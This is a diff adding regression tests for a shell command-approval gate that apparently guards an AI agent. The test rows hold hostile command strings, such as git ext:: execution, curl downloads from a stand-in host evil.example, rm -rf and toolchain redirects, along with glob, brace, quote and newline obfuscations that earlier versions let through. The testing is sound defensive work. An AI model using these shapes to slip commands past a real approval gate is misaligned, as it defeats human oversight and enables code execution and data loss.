@@ -1961,8 +1961,8 @@ check_wt "bash find -exec touch outside is unwrapped and escalates (#192 bypass 
   "$WT_184" 'find . -maxdepth 0 -exec touch /outside/marker \;' escalate
 check_wt "bash piped to xargs touch outside is unwrapped and escalates (#192 bypass C)" \
   "$WT_184" 'echo /outside/marker | xargs touch' escalate
-check_wt "bash find -exec touch fully inside the worktree allows (unwrap, not blanket fail-closed)" \
-  "$WT_184" 'find . -exec touch .handoffs/x \;' allow
+check_wt "bash find -exec touch (round 3, #261 r3): touch is not on the inner read-only allowlist, escalates even fully inside the worktree now" \
+  "$WT_184" 'find . -exec touch .handoffs/x \;' escalate
 check_wt "bash plain find with no -exec writes nothing, allows (the dominant real-world find shape)" \
   "$WT_184" "find . -name '*.log'" allow
 
@@ -2246,6 +2246,122 @@ check "F5: dashed form carrying an exec-bearing option" \
   'git-log --output=/tmp/herdr-r3-marker' escalate
 check "F5: dashed form, plain read, stays allow (consistent with 'git log')" \
   "git-log" allow
+
+# F6 (fix/wrapper-unwrap, SPEC #257 r2 PART A rows 186-193): the exact
+# shapes measured ALLOW on trunk — `find`'s `-exec`/`-execdir`/`-ok`
+# clauses, `script`, `arch` and `xcrun` all wrapped an exec-unsafe git
+# invocation invisibly to this gate. `xargs`, `timeout` and `nice` with
+# the identical inner git call already escalated (F3 above / the generic
+# launcher skip in `_cp_locate_command_word`); these five did not.
+check "F6: find -exec wraps a global -C ahead of the subcommand" \
+  "find . -maxdepth 0 -exec git -C /tmp/evilrepo status \\;" escalate
+check "F6: find -exec wraps an exec-capable ls-remote" \
+  "find . -exec git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "F6: script wraps a global -C ahead of the subcommand" \
+  "script -q /dev/null git -C /tmp/evilrepo status" escalate
+check "F6: arch wraps an exec-capable ls-remote" \
+  "arch -arm64 git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F6: xcrun wraps a global -C ahead of the subcommand" \
+  "xcrun git -P -C /tmp/evilrepo status" escalate
+
+# F7: the rest of the wrapper list SPEC names that need a dedicated
+# extractor (not just the generic `_cp_locate_command_word` skip-list) —
+# `find`'s other three clause spellings, and `chroot`/`sandbox-exec`/
+# `unbuffer`, which SPEC asks to "check ... using the existing unwrap".
+check "F7: find -execdir wraps an exec-capable ls-remote" \
+  "find . -execdir git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "F7: find -ok wraps an exec-capable ls-remote" \
+  "find . -ok git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "F7: find -okdir wraps an exec-capable ls-remote" \
+  "find . -okdir git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "F7: find -exec with the + terminator wraps the same way" \
+  "find . -exec git -c protocol.ext.allow=always ls-remote ext::id +" escalate
+check "F7: chroot wraps a global -C ahead of the subcommand" \
+  "chroot /tmp git -C /tmp/evilrepo status" escalate
+check "F7: sandbox-exec wraps an exec-capable ls-remote" \
+  "sandbox-exec -n nobody git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F7: unbuffer wraps a global -C ahead of the subcommand" \
+  "unbuffer git -C /tmp/evilrepo status" escalate
+
+# F8: regression confirmation for the launchers already resolved generically
+# by `_cp_locate_command_word` (SPEC: "check caffeinate, sudo ..., using the
+# existing unwrap") plus `watch`, newly added to the xargs/parallel fan-out
+# arm — these must already escalate and must keep doing so.
+check "F8: caffeinate wraps an exec-capable ls-remote" \
+  "caffeinate -i git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: sudo wraps a global -C ahead of the subcommand" \
+  "sudo git -C /tmp/evilrepo status" escalate
+check "F8: env wraps an exec-capable ls-remote" \
+  "env git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: command wraps a global -C ahead of the subcommand" \
+  "command git -C /tmp/evilrepo status" escalate
+check "F8: builtin wraps an exec-capable ls-remote" \
+  "builtin git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: exec wraps a global -C ahead of the subcommand" \
+  "exec git -C /tmp/evilrepo status" escalate
+check "F8: nohup wraps an exec-capable ls-remote" \
+  "nohup git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: stdbuf wraps a global -C ahead of the subcommand" \
+  "stdbuf -i0 git -C /tmp/evilrepo status" escalate
+check "F8: time wraps an exec-capable ls-remote" \
+  "time git -c protocol.ext.allow=always ls-remote ext::id" escalate
+check "F8: watch wraps git, fan-out arm, fails closed regardless of argv" \
+  "watch git log" escalate
+
+# F9 (round 3, SPEC #261 r3): the fix no longer tries to prove a wrapped
+# command SAFE — `find -exec`/`script`/`arch`/`xcrun` carrying any actual
+# command (git included) now escalate unconditionally; see the round-3
+# block at the end of this file for the full rationale. Only `chroot`
+# (out of this round's scope) and `xcrun`'s genuinely non-executing
+# lookup modes still judge the wrapped command on its own merits.
+check "F9 (round 3): find -exec now ALWAYS escalates, even a safe read" \
+  "find . -maxdepth 0 -exec git log \\;" escalate
+check "F9 (round 3): script now ALWAYS escalates, even a safe read" \
+  "script -q /dev/null git log" escalate
+check "F9 (round 3): arch now ALWAYS escalates, even a safe read" \
+  "arch -arm64 git log" escalate
+check "F9 (round 3): xcrun now ALWAYS escalates, even a safe read" \
+  "xcrun git log" escalate
+check "F9: chroot wraps a safe read, stays allow" \
+  "chroot /tmp git log" allow
+check "F9: xcrun --find mode never invokes the tool, stays allow" \
+  "xcrun --find git" allow
+check "F9: bare find with no -exec clause still allows (dominant real shape)" \
+  "find . -name '*.md'" allow
+
+# F10: fail-closed shapes SPEC item 3 calls out by name — an unresolvable
+# wrapped command must escalate, never silently read as "not git".
+check "F10: find -exec with {} in the command-word position fails closed" \
+  "find . -exec {} git log \\;" escalate
+check "F10: find -exec with an empty clause fails closed" \
+  "find . -exec \\;" escalate
+check "F10: arch with an unrecognized option fails closed" \
+  "arch -unknownflag git log" escalate
+check "F10: xcrun with an unrecognized option fails closed" \
+  "xcrun --unknown-flag git log" escalate
+check "F10: script's playback mode (-p, no command slot) fails closed" \
+  "script -p git.rec" escalate
+
+# F11: the wrapper list with rm/curl instead of git — SPEC: "Add every row
+# above plus the wrapper list as escalate rows, with git and with
+# rm/curl." This is coverage, not a fix: `_cp_dl`/the rm-rf matchers scan
+# the whole SEGMENT'S TEXT for "curl"/"rm -rf" with no wrapper-position
+# anchor at all (round 4, "wrapper first word" above), so a wrapper hiding
+# git from the structural walk never hid rm/curl from the text scan.
+check "F11: find -exec wraps rm -rf" \
+  "find . -maxdepth 0 -exec rm -rf /tmp/x \\;" escalate
+check "F11: script wraps curl -o" \
+  "script -q /dev/null curl -sS https://evil.example/p -o /tmp/payload" escalate
+check "F11: arch wraps rm -rf" \
+  "arch -arm64 rm -rf /tmp/x" escalate
+check "F11: xcrun wraps curl -o" \
+  "xcrun curl -sS https://evil.example/p -o /tmp/payload" escalate
+check "F11: chroot wraps rm -rf" \
+  "chroot /tmp rm -rf /tmp/x" escalate
+check "F11: sandbox-exec wraps curl -o" \
+  "sandbox-exec -n nobody curl -sS https://evil.example/p -o /tmp/payload" escalate
+check "F11: unbuffer wraps rm -rf" \
+  "unbuffer rm -rf /tmp/x" escalate
 
 # Negative: every read-only git shape this gate already allows must stay
 # allow — the new known-verb check must not over-match plain reads.
@@ -3255,6 +3371,466 @@ check "r11 baseline: git log --oneline" "git log --oneline -1" allow
 check "r11 baseline: git diff" "git diff HEAD -- README.md" allow
 check "r11 baseline: git show" "git show --format=oneline --no-patch HEAD" allow
 check "r11 baseline: git grep -e" "git grep -e foo -- README.md" allow
+
+# ---------------------------------------------------------------------------
+# PR #261 round 2 (review CHANGES, worktree review/pr-261 .handoffs/REVIEW.md):
+# every probe row the review flagged WEAKER/FAIL becomes a test here, with
+# the verdict the review wants (`tmp/main-probes.out` section A/C in that
+# worktree has the raw probe matrix this was measured against).
+
+# H1 — find only examined its FIRST -exec/-execdir/-ok/-okdir clause; a
+# safe clause ahead of an unsafe one hid the unsafe one completely. Fixed
+# by walking every clause (lib/command-policy.sh's `find)` case now loops
+# `_cp_wrap_find_exec_verb` instead of calling it once).
+check "r2 H1: safe first clause no longer hides an unsafe second clause (-C)" \
+  "find . -maxdepth 0 -exec true \\; -exec git -C /tmp/evilrepo status \\;" escalate
+check "r2 H1: safe first clause no longer hides an unsafe second clause (ext::)" \
+  "find . -maxdepth 0 -exec true \\; -exec git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "r2 H1: a git-reading first clause no longer hides an unsafe second git clause" \
+  "find . -maxdepth 0 -exec git log \\; -exec git -C /tmp/evilrepo status \\;" escalate
+check "r2 H1 (round 3): all-safe clauses now escalate too — find -exec no longer parses git's safety" \
+  "find . -maxdepth 0 -exec git log \\; -exec git log -1 \\;" escalate
+
+# H2 — a generic launcher or second wrapper in front of git inside a wrap
+# tail was never re-unwrapped; `_cp_wrap_tail_unsafe` now re-enters
+# `_cp_git_seg_exec_unsafe` on anything that isn't git itself, so a nested
+# launcher/wrapper gets the full judgment again (depth-capped).
+check "r2 H2: find -exec wraps nice wraps git -C" \
+  "find . -maxdepth 0 -exec nice git -C /tmp/evilrepo status \\;" escalate
+check "r2 H2: nice find -exec wraps script wraps git -C (the exact SPEC shape)" \
+  "nice find . -maxdepth 0 -exec script -q /dev/null git -C /tmp/evilrepo status \\;" escalate
+check "r2 H2: script wraps nice wraps git -C" \
+  "script -q /dev/null nice git -C /tmp/evilrepo status" escalate
+check "r2 H2: script wraps arch wraps git -C" \
+  "script -q /dev/null arch -arm64 git -C /tmp/evilrepo status" escalate
+check "r2 H2: arch wraps nice wraps git -C" \
+  "arch -arm64 nice git -C /tmp/evilrepo status" escalate
+check "r2 H2: arch wraps script wraps git -C" \
+  "arch -arm64 script -q /dev/null git -C /tmp/evilrepo status" escalate
+check "r2 H2: xcrun wraps nice wraps git -C" \
+  "xcrun nice git -C /tmp/evilrepo status" escalate
+check "r2 H2: xcrun wraps arch wraps git -C" \
+  "xcrun arch -arm64 git -C /tmp/evilrepo status" escalate
+check "r2 H2 (round 3): script now ALWAYS escalates, even nested-safe" \
+  "script -q /dev/null nice git log" escalate
+
+# H3 — xcrun's -f/--find and -r/--run are a MODE, not independently final;
+# the LAST one on the line wins. The old extractor returned the moment it
+# saw -f/--find, so a later -r/--run silently never ran.
+check "r2 H3: xcrun -f -r — -r wins, the git call underneath still judged" \
+  "xcrun -f -r git -C /tmp/evilrepo status" escalate
+check "r2 H3: xcrun --find --run — long spelling, -run wins" \
+  "xcrun --find --run git -C /tmp/evilrepo status" escalate
+check "r2 H3: xcrun -l -f -r — unrelated flag between find/run doesn't confuse mode tracking" \
+  "xcrun -l -f -r git -C /tmp/evilrepo status" escalate
+check "r2 H3 (round 3): xcrun -f -r now ALWAYS escalates once -r wins, even a safe read" \
+  "xcrun -f -r git log" escalate
+
+# H4 — an unreadable wrapped command word ($VAR) fell through to "not
+# git" instead of failing closed, the same way {}/empty already did.
+check "r2 H4: find -exec \$VAR fails closed" \
+  "find . -maxdepth 0 -exec \$G -C /tmp/evilrepo status \\;" escalate
+check "r2 H4: script \$VAR fails closed" \
+  "script -q /dev/null \$G -C /tmp/evilrepo status" escalate
+check "r2 H4: arch \"\$VAR\" (quoted) fails closed" \
+  "arch -arm64 \"\$G\" -C /tmp/evilrepo status" escalate
+check "r2 H4: xcrun \$VAR fails closed" \
+  "xcrun \$G -C /tmp/evilrepo status" escalate
+
+# M1 — find's clause loop used to stop a clause at ANY bare `+`; real find
+# ends a clause at `+` only when `+` directly follows a literal `{}` word.
+check "r2 M1: a bare + mid-clause is an ordinary argument, not a terminator" \
+  "find . -maxdepth 0 -exec git grep -e foo + -O/tmp/evil.sh \\;" escalate
+check "r2 M1: {} + is still recognized as the real terminator (no regression)" \
+  "find . -exec grep -lF needle {} +" allow
+
+# M2 — script/chroot with NO trailing command run \$SHELL/the login shell;
+# an ahead-of-it SHELL= assignment is unsafe even though no command word
+# is present to judge.
+check "r2 M2: SHELL= ahead of a command-less script escalates" \
+  "SHELL=/tmp/evil.sh script -q /dev/null" escalate
+check "r2 M2 (round 3): a command-less script now ALWAYS escalates too" \
+  "script -q /dev/null" escalate
+
+# L1 — real xcrun also accepts single-dash long spellings (-sdk,
+# -toolchain, -find, -run, -log); the old table only had the double-dash
+# forms and over-blocked these with a misleading git-option reason.
+check "r2 L1: xcrun -find (single-dash) is read-only, allows" \
+  "xcrun -find clang" allow
+check "r2 L1: xcrun -sdk ... --show-sdk-path (single-dash sdk) allows" \
+  "xcrun -sdk macosx --show-sdk-path" allow
+
+# ---------------------------------------------------------------------------
+# round 3 (Main's live run of round 2: verify-command-policy 1417/1419, 2
+# FAIL on r2 H1; review-probes 42/45, 3 FAIL on xcrun toolchain redirects).
+
+# r2 H1's two cases were a real bug, not a wrong trace: `_CP_LOC` is a
+# GLOBAL array `_cp_locate_command_word` overwrites on every call, and
+# `find)`'s clause loop re-read `"${_CP_LOC[@]:1}"` on each iteration —
+# but the SAME loop calls `_cp_wrap_tail_unsafe`, which recurses back into
+# `_cp_locate_command_word` for a non-git tail and clobbered `_CP_LOC`
+# before the loop's next read. A first SAFE clause (whose tail recurses)
+# silently fed the SECOND clause's scan an empty argv. Fixed by
+# snapshotting find's own args into a local array once, before the loop.
+check "r3 H1 regression: safe-tail-then-unsafe-clause no longer clobbers the scan (-C)" \
+  "find . -maxdepth 0 -exec true \\; -exec git -C /tmp/evilrepo status \\;" escalate
+check "r3 H1 regression: safe-tail-then-unsafe-clause no longer clobbers the scan (ext::)" \
+  "find . -maxdepth 0 -exec true \\; -exec git -c protocol.ext.allow=always ls-remote ext::id \\;" escalate
+check "r3 H1 regression: a NESTED-but-safe first clause (recurses) doesn't clobber the second either" \
+  "find . -maxdepth 0 -exec nice git log \\; -exec git -C /tmp/evilrepo status \\;" escalate
+
+# SPEC brief item 3: xcrun toolchain/SDK redirects escalate — the
+# `--sdk`/`-sdk` PATH-value form, `--toolchain`/`-toolchain` with any
+# value, and the `DEVELOPER_DIR=`/`SDKROOT=`/`TOOLCHAINS=` env-prefix form
+# of the same redirect.
+check "r3 item3: DEVELOPER_DIR= env prefix redirects xcrun's toolchain" \
+  "DEVELOPER_DIR=/tmp/evil xcrun git log" escalate
+check "r3 item3: SDKROOT= env prefix redirects xcrun's SDK" \
+  "SDKROOT=/tmp/evil xcrun git log" escalate
+check "r3 item3: TOOLCHAINS= env prefix redirects xcrun's toolchain" \
+  "TOOLCHAINS=com.evil.toolchain xcrun git log" escalate
+check "r3 item3: --sdk with a path value redirects the SDK" \
+  "xcrun --sdk /tmp/evil git log" escalate
+check "r3 item3: -sdk (single-dash) with a path value redirects the SDK" \
+  "xcrun -sdk /tmp/evil git log" escalate
+check "r3 item3: --toolchain always redirects, even with a plain-looking name" \
+  "xcrun --toolchain /tmp/evil git log" escalate
+check "r3 item3: -toolchain (single-dash) always redirects" \
+  "xcrun -toolchain com.evil.toolchain git log" escalate
+check "r3 item3: --toolchain=VALUE (glued) always redirects" \
+  "xcrun --toolchain=/tmp/evil git log" escalate
+check "r3 item3 negative (round 3): --sdk with a plain SDK name no longer saves it — any trailing command through xcrun now escalates" \
+  "xcrun --sdk macosx git log" escalate
+check "r3 item3 negative: -sdk (single-dash) with a plain name stays allow (no regression on L1)" \
+  "xcrun -sdk macosx --show-sdk-path" allow
+
+# ---------------------------------------------------------------------------
+# #261 round 3 (review of round 2: 5 HIGH findings, N1-N5 — a classifier
+# that keeps reopening on find/script/arch/xcrun's own sub-grammar stops
+# parsing it). `_cp_find_exec_unsafe`/`_cp_wrap_arch_has_cmd`/
+# `_cp_wrap_xcrun_verb` in lib/command-policy.sh replace every extractor
+# the F6-F11/H1-H4/M1-M2/L1 sections above exercised; those sections stay
+# (updated in place above for the rows whose verdict genuinely changed)
+# because the shapes they name are still real probes, just judged by the
+# new narrower rule now.
+
+# SPEC's own three required rows.
+check "#261 r3: find with no -exec primary allows, as trunk" \
+  "find . -name \"*.md\"" allow
+check "#261 r3: find -exec wc (allowlisted tool) allows" \
+  "find . -type f -exec wc -l {} +" allow
+check "#261 r3: find -exec rm (not on the allowlist) escalates" \
+  "find . -exec rm {} \\;" escalate
+
+# N1: a glob command word is unreadable the same way an expansion is —
+# bare, and through every wrapper.
+check "#261 r3 N1: bare glob command word escalates" \
+  "[g]it -C /tmp/evilrepo status" escalate
+check "#261 r3 N1: find -exec with a glob command word escalates" \
+  "find . -exec g* -C /tmp/evilrepo status \\;" escalate
+check "#261 r3 N1: path-qualified glob command word escalates" \
+  "/usr/bin/gi[t] -C /tmp/evilrepo status" escalate
+
+# N2/N5: a find clause only ends on the EXACT terminator, and only a
+# literal `-exec`/`-execdir`/`-ok`/`-okdir` token starts one — never a
+# prefix spelling or a different primary's own argument value.
+check "#261 r3 N2: a word merely starting with ';' does not end a clause early" \
+  "find . -exec true ';x' -exec rm -rf /tmp/x \\;" escalate
+check "#261 r3 N5: -exec spelled as -name's own pattern argument still fails closed" \
+  "find . -name -exec -o -exec rm -rf /tmp/x \\;" escalate
+
+# N3: an unquoted expansion in find's own argv can inject a brand-new
+# -exec clause at runtime that the token walk never sees.
+check "#261 r3 N3: an unquoted variable standing in for find's own args escalates" \
+  "find . \$X" escalate
+check "#261 r3 N3: a quoted expansion as find's search root stays allow (OB)" \
+  "find \"\$ROOT\" -type f" allow
+
+# N4: SHELL/DEVELOPER_DIR/TOOLCHAINS/SDKROOT are exec-capable names
+# wherever they sit, not just inside the wrapper's own segment — a bare
+# DEVELOPER_DIR= ahead of git is exactly as dangerous (git is Apple's
+# xcode-select shim) as one ahead of xcrun.
+check "#261 r3 N4: DEVELOPER_DIR= ahead of a BARE git call escalates (no xcrun involved)" \
+  "DEVELOPER_DIR=/tmp/evil git log" escalate
+check "#261 r3 N4: arch -e DEVELOPER_DIR= still escalates" \
+  "arch -e DEVELOPER_DIR=/tmp/evil xcrun git log" escalate
+
+# script/arch/xcrun carrying any command always escalate now — agents
+# never need these tools; only xcrun's genuinely non-executing lookups
+# (no trailing command) keep trunk's verdict.
+check "#261 r3: script with no command at all still escalates" \
+  "script -q /dev/null" escalate
+check "#261 r3: xcrun -f with no -r stays a non-executing lookup, allows" \
+  "xcrun -f clang" allow
+check "#261 r3: xcrun --show-sdk-path alone stays a non-executing lookup, allows" \
+  "xcrun --show-sdk-path" allow
+
+# #261 r3 live-run finding (4): the measured OB rows below are DELIBERATE
+# over-blocks per the brief, not bugs — agents never need script/arch/
+# xcrun at all, and find -exec's allowlist is ten read-only tools, full
+# stop. Pinned here explicitly so a future round doesn't mistake a
+# regression test for a live bug and "fix" it back open.
+check "#261 r3 (deliberate OB): script running a genuinely safe read now escalates" \
+  "script -q /dev/null cat README.md" escalate
+check "#261 r3 (deliberate OB): arch running a genuinely safe read now escalates" \
+  "arch -arm64 cat README.md" escalate
+check "#261 r3 (deliberate OB): xcrun running a genuinely safe read now escalates" \
+  "xcrun cat README.md" escalate
+check "#261 r3 (deliberate OB): find -exec git (not on the allowlist) escalates" \
+  "find . -exec git log \\;" escalate
+check "#261 r3 (deliberate OB): find -exec shellcheck (not on the allowlist) escalates" \
+  "find . -name '*.sh' -exec shellcheck {} +" escalate
+check "#261 r3 (deliberate OB): xcrun simctl (a real tool invocation, not an info-only lookup) escalates" \
+  "xcrun simctl list devices" escalate
+
+# #261 r3 live-run finding (1): four more launchers Main's live probes
+# found still allowing a wrapped unsafe git call straight through,
+# because they are neither on the generic transparent-launcher skip
+# list (sudo/env/nice/.../caffeinate/unbuffer/sandbox-exec — those
+# already resolve PAST themselves to the real command word) nor on the
+# per-tool extractor dispatch (find/script/arch/xcrun/chroot/flock) —
+# `_cp_wcmd` stopped AT the launcher name and no case arm matched it, so
+# the default `return 1` (not unsafe) let it through untouched.
+check "#261 r3 N1-launcher: taskpolicy wrapping git -C escalates" \
+  "taskpolicy -c utility git -C /tmp/evilrepo status" escalate
+check "#261 r3 N1-launcher: direnv exec wrapping git -C escalates" \
+  "direnv exec . git -C /tmp/evilrepo status" escalate
+check "#261 r3 N1-launcher: mise exec wrapping git -C escalates" \
+  "mise exec -- git -C /tmp/evilrepo status" escalate
+check "#261 r3 N1-launcher: launchctl asuser wrapping git -C escalates" \
+  "launchctl asuser 501 git -C /tmp/evilrepo status" escalate
+check "#261 r3 N1-launcher: a bare launcher with nothing trailing is not a wrapped command, allows" \
+  "direnv" allow
+
+# ---------------------------------------------------------------------------
+# #261 round 4 (review of round 3: CHANGES — ATK-glob6 HIGH reopened N3 in
+# a narrower form, open joins the launcher class, two bare-wrapper
+# over-blocks judged against origin/main's own verdict). Every row below
+# is a FAIL in round 3's main-probes.out (43 pass, 9 fail), pinned here
+# with its round-4 decided verdict — fixed where the brief calls for a
+# fix, left exactly as measured where the brief says leave it.
+
+# ATK-glob6 (HIGH, fixed): a bare, non-flag-shaped, unquoted glob
+# character in find's own path/expression argv — outside any already-
+# recognized -exec clause — used to be invisible to both the clause-level
+# glob check (only fires on a token starting with '-') and the word-
+# injection check (only looked for '$'/backtick). Real BSD find accepts
+# a shell-glob-expanded '-exec' there as a genuine primitive.
+check "#261 r4 ATK-glob6: a bare unquoted glob in find's own argv escalates" \
+  "find . * -maxdepth 0" escalate
+check "#261 r4 ATK-glob6: an unquoted glob after find's OWN flag/value pair still escalates" \
+  "find . -newer /tmp/ref * -maxdepth 0" escalate
+check "#261 r4 ATK-glob6-OB: a QUOTED glob pattern keeps today's verdict, allows" \
+  "find . -name '*.md'" allow
+
+# ATK-tilde-safe (decided: stays escalated, on purpose — brief item 4):
+# a path-qualified -exec clause command word is judged by its own
+# literal spelling, not its resolved target; tightening this to resolve
+# `~/../../usr/bin/wc` down to the bare allowlisted name is out of scope
+# for this round.
+check "#261 r4 ATK-tilde-safe: find -exec through a path-qualified ~/../.. wc stays escalated (deliberate, brief item 4)" \
+  "find . -exec ~/../../usr/bin/wc -l {} \\;" escalate
+
+# open (MEDIUM, fixed): open -a/--args is a stock macOS launcher capable
+# of passing attacker-controlled argv to another application's main().
+check "#261 r4 open: open -a <application> joins the always-escalate launcher class" \
+  "open -a /Applications/Terminal.app" escalate
+check "#261 r4 open: open --args passes argv through, escalates" \
+  "open -a /Applications/Foo.app --args --evil-flag" escalate
+check "#261 r4 open (OB): a bare open <file-or-url> with neither flag keeps trunk's verdict, allows" \
+  "open ./report.pdf" allow
+
+# Over-block rows judged against origin/main's own verdict (brief item
+# 4): main has no taskpolicy rule at all, and main's only launchctl rule
+# matches getenv/export, never list — so both bare forms below allow on
+# main today. Wrapping an actual command through either still escalates
+# unchanged (N1-launcher checks above).
+check "#261 r4 (OB fixed): bare 'taskpolicy -c utility' with no program carries nothing to run, allows (matches origin/main)" \
+  "taskpolicy -c utility" allow
+check "#261 r4 (OB fixed): bare 'launchctl list' is a pure read, allows (matches origin/main)" \
+  "launchctl list" allow
+check "#261 r4 (OB fixed, regression): taskpolicy wrapping an actual program still escalates" \
+  "taskpolicy -c utility git log" escalate
+check "#261 r4 (OB fixed, regression): launchctl list with a trailing service-target still escalates" \
+  "launchctl list com.apple.Finder" escalate
+
+# Remaining main-probes FAIL rows: measured over-blocks the brief does
+# NOT ask to fix this round (script/arch/xcrun running ANY command, and
+# find's own read-only-tool-collateral arg charset, are deliberate
+# design per the round-3 header) — pinned here so a future round doesn't
+# mistake either for a regression and "fix" it back open.
+check "#261 r4 (OB, deliberate, unchanged): bare 'script -q /dev/null' still escalates (script always escalates)" \
+  "script -q /dev/null" escalate
+check "#261 r4 (OB, deliberate, unchanged): arch running a safe read still escalates" \
+  "arch -arm64 git log" escalate
+check "#261 r4 (OB, deliberate, unchanged): xcrun running a real tool still escalates" \
+  "xcrun simctl list devices" escalate
+check "#261 r4 (OB, deliberate, unchanged): find -exec grep whose own argument is an unquoted expansion fails the clause arg charset closed" \
+  "find \"\$ROOT\" -type f \\( -name pre-commit -o -name pre-merge-commit \\) -exec grep -lF \"\$DEPLOYED\" {} +" escalate
+
+# ATK-fifo (MEDIUM, documented, not coded): the 10-tool find -exec
+# allowlist includes cat/head/tail/wc/shasum, all of which block
+# indefinitely reading a FIFO with no writer. Out of scope for this
+# classifier — it judges static command TEXT and cannot see the
+# filesystem at the time the command actually runs, so it cannot tell a
+# real file from an attacker-planted FIFO at the path a -exec clause
+# names. No test: there is no text-level distinction to assert.
+
+# #261 r5: _cp_find_word_injection_present rewritten to locate each
+# segment's command word via _cp_locate_command_word (the same machinery
+# the git rules use), fed a quote-PRESERVING protect pass
+# (_cp_protect_text_qa) instead of raw-text `grep -q find`. Any command
+# word carrying a surviving quote/backslash character escalates — a
+# real command word never needs quoting — which closes every desync
+# spelling in one check instead of enumerating shapes.
+check "#261 r5 ATK4-desync: a quoted find basename escalates" \
+  "\"find\" . * -maxdepth 0" escalate
+check "#261 r5 ATK4-desync: an empty-quote-spliced find basename escalates" \
+  "fi''nd . * -maxdepth 0" escalate
+check "#261 r5 ATK4-desync: a backslash-spliced find basename escalates" \
+  "f\\ind . * -maxdepth 0" escalate
+check "#261 r5 ATK4-desync: a double-quote-spliced find basename escalates" \
+  "fin\"\"d . * -maxdepth 0" escalate
+check "#261 r5 ATK4-desync: a quoted-text decoy ahead of a real find no longer desyncs the cut" \
+  "cd \"/tmp/findings\" && find . * -maxdepth 0" escalate
+check "#261 r5 ATK4-desync: the word 'find' inside an unrelated quoted grep pattern no longer desyncs the cut" \
+  "grep -l 'find' README.md; find . * -maxdepth 0" escalate
+check "#261 r5 ATK4-desync-N3: a quoted find basename with the \$-half of N3 escalates" \
+  "\"find\" . \$X" escalate
+check "#261 r5 ATK4-desync-N3: a quoted-text decoy ahead of the \$-half of N3 no longer desyncs the cut" \
+  "cd \"/tmp/findings\" && find . \$X -type f" escalate
+check "#261 r5 ATK4-desync (regression): a quoted command word on a non-find command also escalates (never needs quoting)" \
+  "\"git\" push" escalate
+
+# ATK4-braceseq: bash brace-expands a one-element SEQUENCE (`{a..z}`),
+# not just the comma form, to a plain letter run with no comma anywhere
+# — closed in the command-word gate (_cp_gate_command_word_is_expansion)
+# and in find's own argv scan (_cp_find_word_injection_present) and in
+# the whole-text opaque-word gate (_cp_exec_name_or_opaque_present).
+check "#261 r5 ATK4-braceseq: a brace-sequence -exec primary in find's own argv escalates" \
+  "find . -exe{c..c} git -C /tmp/evilrepo status \\;" escalate
+check "#261 r5 ATK4-braceseq: a brace-sequence find command word escalates" \
+  "{f..f}ind . -exec git -C /tmp/evilrepo status \\;" escalate
+check "#261 r5 ATK4-braceseq: a brace-sequence git command word escalates" \
+  "{g..g}it -C /tmp/evilrepo status" escalate
+check "#261 r5 ATK4-braceseq: a quoted-text decoy ahead of a brace-sequence find still escalates" \
+  "cd \"/tmp/findings\" && find . -exe{c..c} git -C /tmp/evilrepo status \\;" escalate
+
+# ATK4-newline: a real embedded newline inside a quoted multi-line find
+# argument used to reset AWK's quote-tracking state at the next record,
+# hiding whatever unquoted glob/expansion followed on that next line.
+check "#261 r5 ATK4-newline: an unquoted glob after a quoted multi-line argument escalates" \
+  $'find . \'a\nb\' * -maxdepth 0' escalate
+check "#261 r5 ATK4-newline: an unquoted expansion after a quoted multi-line argument escalates" \
+  $'find . \'a\nb\' $X' escalate
+
+# LNCH4-open: real `open` uses getopt, so the app-selecting flag is not
+# just the exact token `-a` — it clusters (`-na`) and takes an attached
+# value (`-aTerminal`); `-b <bundle-id>` selects an app the same way.
+check "#261 r5 LNCH4-open: a clustered -na flag escalates" \
+  "open -na Terminal /tmp/x.command" escalate
+check "#261 r5 LNCH4-open: an attached -aTerminal flag escalates" \
+  "open -aTerminal /tmp/x.command" escalate
+check "#261 r5 LNCH4-open: a clustered -gja flag escalates" \
+  "open -gja Terminal /tmp/x.command" escalate
+check "#261 r5 LNCH4-open: -b <bundle-id> app selection escalates" \
+  "open -b com.apple.Terminal /tmp/x.command" escalate
+check "#261 r5 LNCH4-open (regression): a bare open with no a/b flag stays allow" \
+  "open -n /tmp/x.command" allow
+
+# INNER-libxo: `wc`/`ls` (and other BSD tools) load an
+# `--libxo=encoder=<name>` plugin by NAME — a clause argument shaped
+# like a long option is not automatically read-only collateral the way
+# a short flag or bare path/pattern is.
+check "#261 r5 INNER-libxo: wc --libxo=encoder=<path> inside a -exec clause escalates" \
+  "find . -exec wc --libxo=encoder=../../../../tmp/evil {} \\;" escalate
+check "#261 r5 INNER-libxo: ls --libxo=encoder=<path> inside a -exec clause escalates" \
+  "find . -exec ls --libxo=encoder=../../../../tmp/evil {} \\;" escalate
+check "#261 r5 INNER-libxo (regression): wc's closed-list long options still allow" \
+  "find . -exec wc --lines {} \\;" allow
+
+# round 5b (Main's live run of round 5): a command word that is ONE
+# fully-quoted plain word is equivalent to unquoted — an argv-quoting
+# caller (every word individually shell-quoted) is ordinary, not an
+# obfuscation. Only MIXED/PARTIAL quoting stays opaque.
+check "#261 r5b: every-argv-word shell-quoted (hub launch shape), single quotes, stays allow" \
+  "'python3' '-m' 'http.server' '8123'" allow
+check "#261 r5b: every-argv-word shell-quoted, double quotes, stays allow" \
+  "\"python3\" -m http.server" allow
+check "#261 r5b: a cleanly single-quoted find basename still applies the find rule, escalates" \
+  "'find' . * -maxdepth 0" escalate
+check "#261 r5b: a cleanly double-quoted find basename still applies the find rule, escalates" \
+  "\"find\" . * -maxdepth 0" escalate
+check "#261 r5b (regression): mixed/partial quoting on a non-find command word still escalates" \
+  "fi''nd push" escalate
+
+# INNER-write: `file -C -m <path>` compiles a `.mgc` magic database into
+# the CURRENT directory — a write, not a read; `file` dropped from the
+# find -exec allowlist entirely.
+check "#261 r5 INNER-write: file -C -m inside a -exec clause escalates" \
+  "find . -exec file -C -m /tmp/magic {} \\;" escalate
+
+# #261 r6 round 2 (Main's live run of round 5 + round-6 probes, SPEC's own
